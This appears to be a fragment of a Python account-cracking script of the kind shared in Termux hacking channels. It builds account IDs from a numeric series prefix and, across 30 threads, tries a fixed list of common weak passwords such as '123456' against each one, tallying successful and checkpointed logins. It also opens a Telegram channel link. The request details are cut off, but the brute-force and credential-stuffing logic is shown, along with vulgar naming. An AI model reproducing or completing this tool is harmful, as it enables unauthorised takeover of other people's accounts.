...
def fuckMyxAXN(series):
    ____banner____()
    os.system("xdg-open https://t.me/termux404xixemon1")
    global gen
    if series == "100000":
        SEX = "100000"
        SEX2 = 9
    ...
    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
        ...
        for love in gen:
            ids = SEX + love
            passlist = ["123456", "1234567", "12345678", "123456789"," 123321","1234567890"]
            headers = {
...
def Fucking_life(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f"\rXIXEMON❣️[{loop}]|OK:[{len(cps)}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
